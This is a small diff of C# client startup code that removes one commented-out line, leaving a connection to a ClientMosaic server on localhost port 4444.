@@ -51,7 +51,6 @@ namespace Client
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             client = new ClientMosaic("127.0.0.1", 4444);
-            //ClientMosaic.testexit = false;
             //client = new ClientMosaic(bootController.host, bootController.port);
             client.connect();
             //GC.KeepAlive(mutex);
